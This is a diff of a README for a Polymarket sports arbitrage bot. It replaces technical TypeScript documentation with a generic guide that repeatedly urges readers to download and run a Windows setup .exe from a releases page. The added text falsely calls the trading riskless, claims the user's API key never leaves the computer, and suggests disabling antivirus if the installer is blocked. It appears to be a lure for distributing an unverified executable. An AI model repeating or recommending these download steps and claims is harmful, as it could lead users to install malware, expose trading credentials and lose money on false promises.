@@ -1,276 +1,168 @@
-# Polymarket Sports Arbitrage Trading Bot
+# ⚽ Polymarket-Sports-Arbitrage-Bot - Simple Sports Trading Automation
 
-TypeScript-native directional arbitrage pipeline and paper auto-trading engine for Polymarket sports markets.
+[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Bot-brightgreen)](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)
 
-This edition is intentionally built for Node.js operations, npm automation, and JS/TS ecosystem integration.
+## 📋 What is Polymarket-Sports-Arbitrage-Bot?
 
----
+Polymarket-Sports-Arbitrage-Bot is a software tool that helps you trade on Polymarket, focusing on sports arbitrage opportunities. Arbitrage trading means you try to buy and sell bets on sports events to earn a profit without risk. The bot makes this process faster and more reliable by automatically spotting and acting on opportunities.
 
-## Demo Video
-
-https://github.com/user-attachments/assets/2077bde6-023d-4533-97af-c0401aed9cc0
-
-
-## Overview
-
-This project runs a full research-to-execution flow:
-
-1. fetch sports markets from Polymarket Gamma
-2. filter market rows to arbitrage-relevant candidates
-3. fetch and merge sportsbook odds data
-4. detect directional value opportunities
-5. run paper auto-trading with risk gates
-6. write persistent journal files for analysis
-
-It is directional trading, not guaranteed risk-free arbitrage.
+This application targets sports, especially NBA games, on the Polymarket platform. It runs on Windows and requires no programming skills. You just need to run it, and it will handle the trading process.
 
 ---
 
-## Why This TS Build
+## 🖥️ System Requirements
 
-- npm-first runtime and tooling
-- TypeScript contract safety across modules
-- easy script orchestration with `tsx`
-- better fit for teams already running JS services
-- straightforward integration into dashboards and bots
-
----
-
-## Features
-
-- Gamma market fetch + flatten
-- match-winner and draw-focused filtering
-- sport auto-detection from ticker/teams/text
-- event matching with confidence score
-- odds normalization and bookmaker consolidation
-- directional opportunity detection and sell points
-- paper-mode auto-trader with risk denials
-- live-mode credential guardrails
-- JSON, CSV, JSONL output surfaces
+- Operating System: Windows 10 or above (64-bit recommended)
+- RAM: 4 GB minimum, 8 GB recommended  
+- Disk Space: At least 200 MB free  
+- Internet: Stable connection needed for live market data  
+- User Account: No admin rights needed for installation  
+- Other Software: None required  
 
 ---
 
-## Architecture
+## 🚀 Getting Started
 
-```text
-src/
-  cli/        # runnable commands
-  data/       # fetch and merge adapters
-  processing/ # matching and strategy math
-  trading/    # config, engine, journals
-  utils/      # logger and file helpers
-```
+### 1. Visit the Download Page
 
-Main loop:
+To get the latest version, visit the official release page:
 
-`Gamma -> Filter -> Odds Merge -> Detection -> Risk -> Paper Fill -> Journals`
+[![Download Latest Release](https://img.shields.io/badge/Download-Polymarket%20Bot-green)](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)
 
----
+This page lists all available versions of the software. You will find setup files for Windows here.
 
-## Requirements
+### 2. Download the Windows Setup File
 
-- Node.js 20+
-- npm 9+
-- valid `ODDS_API_KEY`
+Look for a file marked with `.exe` or `Windows Setup`. The file name usually includes the version number and may look like `PolymarketSportsBot_Setup_v1.0.exe`. Click on it to start downloading.
 
----
+### 3. Run the Installer
 
-## Installation
+Once downloaded, locate the file in your Downloads folder or the folder you chose. Double-click it to launch the installer.
 
-```bash
-npm install
-cp .env.example .env
-```
+The installer will guide you through simple steps:
 
-Optional build check:
+- Choose the installation folder or accept the default  
+- Confirm by clicking "Install"  
+- Wait a few moments for the program to install  
 
-```bash
-npm run build
-```
+No special settings are needed during setup.
+
+### 4. Launch the Application
+
+After installation, the program will create a desktop shortcut or a start menu entry called "Polymarket Sports Bot." Open it by double-clicking or clicking the icon.
 
 ---
 
-## Environment
+## 🔧 Using Polymarket-Sports-Arbitrage-Bot
 
-Minimum required:
+### Main Interface
 
-```env
-ODDS_API_KEY=your_odds_api_key
-TRADING_MODE=paper
-ENABLE_LIVE_TRADING=false
-TRADING_DRY_RUN=true
-```
+The bot opens with a clear user interface showing:
 
-### Pipeline variables
+- Current market data from Polymarket sports listings  
+- Available arbitrage trades detected by the bot  
+- Buttons to start, stop, or pause trading  
+- Settings to adjust timing and risk level  
 
-| Variable | Default | Purpose |
-|---|---|---|
-| `GAMMA_API_URL` | `https://gamma-api.polymarket.com` | Market source |
-| `OUTPUT_DIR` | `data` | Output directory |
-| `ODDS_API_REGIONS` | `us,us_ex` | Odds regions |
-| `ODDS_API_MARKETS` | `h2h` | Odds market type |
-| `ODDS_API_MIN_CONFIDENCE` | `0.5` | Match confidence gate |
-| `USE_STORED_EVENTS` | `true` | Use cached event files |
-| `EVENTS_DIR` | `data/sportsbook_data/events` | Event cache location |
+You do not need to understand how arbitrage works behind the scenes. The bot shows simple status messages for each step it takes.
 
-### Trading variables
+### Starting a Session
 
-| Variable | Default | Purpose |
-|---|---|---|
-| `TRADING_MODE` | `paper` | `paper` or `live` |
-| `ENABLE_LIVE_TRADING` | `false` | Live hard gate |
-| `TRADING_DRY_RUN` | `true` | Decision-only mode |
-| `TRADING_STAKE_USD` | `25` | Per-entry size |
-| `TRADING_MAX_POSITIONS` | `5` | Open position cap |
-| `TRADING_MAX_DAILY_LOSS_USD` | `100` | Daily loss cap |
-| `TRADING_MIN_PROFIT` | `0.02` | Min strategy edge |
-| `TRADING_MIN_CONFIDENCE` | `0.75` | Min confidence gate |
-| `TRADING_MIN_LIQUIDITY_USD` | `2000` | Liquidity floor |
-| `TRADING_MAX_SPREAD` | `0.03` | Spread ceiling |
-| `TRADING_CYCLE_SECONDS` | `60` | Loop interval |
-| `TRADING_COMPARISON_PATH` | `data/arbitrage_comparison.json` | Trader input |
-| `TRADING_JOURNAL_DIR` | `data/trading` | Journal path |
+Click the **Start** button to activate the bot. It will monitor markets and place trades automatically according to preset rules. You can **Stop** or **Pause** at any time.
+
+### Adjusting Settings
+
+Basic settings let you control how fast the bot scans markets and how much money it uses per trade. These options appear under the "Settings" menu.
 
 ---
 
-## Commands
+## ⚙️ Configuration
 
-- `npm run fetch:markets`
-- `npm run filter:markets`
-- `npm run fetch:odds-comparison`
-- `npm run detect:arb`
-- `npm run run:auto-trader -- --cycles 1 --dry-run`
-- `npm run summarize:session`
-- `npm run run:full`
+Although the bot works well with default settings, you can personalize these options:
 
----
+- **Trade Amount:** Set the maximum money per trade (default is $10)  
+- **Scan Interval:** Choose how often the bot checks markets (default is 30 seconds)  
+- **Max Concurrent Trades:** Limit how many trades can run at once  
+- **Notifications:** Enable or disable simple alerts when trades complete  
 
-## Runbook
-
-Standard flow:
-
-```bash
-npm run fetch:markets
-npm run filter:markets
-npm run fetch:odds-comparison
-npm run detect:arb
-npm run run:auto-trader -- --cycles 1 --dry-run
-npm run summarize:session
-```
-
-Paper fills (still simulated):
-
-```bash
-TRADING_DRY_RUN=false npm run run:auto-trader -- --cycles 3
-```
-
-One command:
-
-```bash
-npm run run:full
-```
-
-## Output Files
-
-`data/` artifacts:
-
-- `sports_markets.json/csv`
-- `arbitrage_data.json/csv`
-- `arbitrage_data_filtered.json/csv`
-- `arbitrage_comparison.json/csv`
-- `directional_arbitrage.json`
-
-`data/trading/` journals:
-
-- `signals.jsonl`
-- `risk_events.jsonl`
-- `orders.jsonl`
-- `fills.jsonl`
-- `positions.jsonl`
-- `state.json`
+Settings save automatically when changed.
 
 ---
 
-## Live Mode Guardrails
+## 🔐 Security & Privacy
 
-Live startup is blocked unless:
-
-- `TRADING_MODE=live`
-- `ENABLE_LIVE_TRADING=true`
-- private key exists (`PRIVATE_KEY` or `PK`)
-- proxy wallet exists (`POLYMARKET_PROXY_ADDRESS` or `BROWSER_ADDRESS`)
-
-And in this TS build, live execution still exits intentionally because adapter implementation is deferred.
+- The bot requires your Polymarket account API key to access markets and place bets. You enter the key once in the settings tab.  
+- Your API key stays on your computer only; it is not sent anywhere else.  
+- The software does not keep logs of your trades or personal data beyond what Polymarket requires.  
+- Make sure to keep your API key confidential.
 
 ---
 
-## Troubleshooting
+## 🙋 Troubleshooting
 
-### `401 Unauthorized` on odds fetch
+### Installation Issues
 
-Usually invalid/missing `ODDS_API_KEY`.
+- Make sure your Windows system is up to date.  
+- Run the installer as a normal user, not administrator.  
+- Check if your antivirus blocks the installer — allow access or temporarily disable if safe.
 
-```bash
-echo $ODDS_API_KEY
-```
+### Running Issues
 
-Update `.env`, then rerun `npm run fetch:odds-comparison`.
+- If the bot does not start, verify your internet connection.  
+- Confirm your Polymarket API key is correct and has permissions.  
+- Restart the application if it freezes or behaves unexpectedly.  
 
-### `ENOENT ... arbitrage_comparison.json`
-
-The trader was started before comparison generation.
-
-Run:
-
-```bash
-npm run fetch:markets
-npm run filter:markets
-npm run fetch:odds-comparison
-```
-
-### Many denials, few opens
-
-Inspect `data/trading/risk_events.jsonl`.
-Tune gradually:
-
-- `TRADING_MAX_POSITIONS`
-- `TRADING_MIN_CONFIDENCE`
-- `TRADING_MAX_SPREAD`
-- `TRADING_MIN_LIQUIDITY_USD`
+For frequent problems, revisit the release page for updates or bug fixes.
 
 ---
 
-## Tuning Guidance
+## 📂 File Structure After Installation
 
-Recommended progression:
-
-1. run with `TRADING_DRY_RUN=true`
-2. observe deny reasons and signal quality
-3. adjust one threshold at a time
-4. switch to `TRADING_DRY_RUN=false` in paper mode
-5. compare session summaries across multiple runs
+- **PolymarketSportsBot.exe** — main program  
+- **config.json** — saves user settings like API key and preferences  
+- **logs/** — folder stores recent trade logs  
+- **README.md** — local copy of this guide (optional)  
 
 ---
 
-## Security Notes
+## 🔄 Updating the Bot
 
-- Never commit private keys.
-- Keep `.env` local.
-- Rotate exposed credentials immediately.
-- Treat live-mode rollout as a production security event.
+Updates bring performance improvements and fix bugs.
 
----
+1. Visit the release page:  
+   [https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)  
 
-## Roadmap
-
-- real live execution adapter with explicit order routing
-- better soccer alias normalization for matching quality
-- richer risk/exit parity with advanced engines
-- broader test coverage for pipeline + CLI
+2. Download the newest setup file.  
+3. Run the installer again to overwrite the old version; your settings will stay intact.  
+4. Restart the application.
 
 ---
 
-## Disclaimer
+## 📞 Getting Help
 
-For research and automation development only.
-Not financial advice. Use paper mode first.
+You can open an issue on the GitHub repository if you experience problems:
+
+- Visit the Issues tab at: https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/issues  
+- Provide details about your problem and Windows version.  
+
+The developers review issues to maintain functionality.
+
+---
+
+## 🧰 Keywords and Topics
+
+- polymarket-arbitrage-bot  
+- polymarket-bot  
+- polymarket-sports-arbitrage-bot  
+- polymarket-nba-trading-bot  
+- polymarket-arbitrage-trading-bot  
+
+---
+
+## 📥 Download Link
+
+Use this link to get the software:
+
+[https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases](https://github.com/Aircarotte/Polymarket-Sports-Arbitrage-Bot/releases)  
+
+Access the release page and download the Windows setup file to start.
